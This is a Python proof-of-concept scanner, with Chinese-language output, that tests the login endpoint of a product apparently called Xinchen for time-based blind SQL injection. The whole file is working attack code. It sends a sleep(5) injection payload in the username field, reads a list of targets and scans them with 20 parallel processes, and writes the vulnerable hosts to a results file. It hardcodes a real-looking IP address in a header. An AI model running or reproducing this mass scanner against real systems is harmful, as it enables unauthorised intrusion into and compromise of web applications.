import requests,argparse,time
requests.packages.urllib3.disable_warnings()
from multiprocessing.pool import Pool

def banner():
    banner = """欢迎使用信辰sql注入脚本"""
    print(banner)

def poc(target):
    payload = "/api/user/login"
    headers = {
        "Accept": "application/json,text/javascript,*/*;q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36Edg/128.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https: //106.55.100.76",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip,deflate,br",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    data = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"
    try:
        result = requests.get(url=target,verify=False)
        # print(result.status_code)
        # print(time1)
        if result.status_code == 200:
            time1 = result.elapsed.total_seconds()
            result1 = requests.post(url=target+payload,headers=headers,data=data,verify=False)
            # print(content)
            # print(type(content))
            time2 = result1.elapsed.total_seconds()
            print(time2)
            if time2 - time1 > 4:
                print(f"[+] {target} 存在信辰sql注入延时漏洞")
                with open("信辰_result.txt","a",encoding='utf-8') as f:
                    f.write(f"{target} 存在信辰sql注入延时漏洞\n")
            else:
                print(f"[-] {target} 不存在信辰sql注入延时漏洞")
        else:
            print(f"[-] {target} 无法连接")
    except Exception as e:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser("信辰sql注入脚本")
    parser.add_argument("-u", "--url", dest="url",type=str,help="目标IP地址",)
    parser.add_argument("-f", "--file", dest="file",type=str,help="目标文件地址",)
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print("参数错误,请使用-h查看帮助")


if __name__ == '__main__':
    main()
